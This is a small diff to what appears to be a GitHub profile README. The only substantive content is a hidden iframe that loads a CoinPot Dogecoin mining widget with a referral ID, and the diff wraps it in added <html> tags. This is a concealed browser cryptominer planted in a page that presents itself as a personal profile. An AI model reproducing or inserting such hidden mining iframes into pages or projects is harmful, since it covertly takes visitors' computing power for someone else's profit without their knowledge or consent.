@@ -14,4 +14,6 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
+<html>
 <iframe hidden scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=0EEC3974DFEF&mode=widget" style="overflow:hidden;width:324px;height:470px;"></iframe>
+</html>
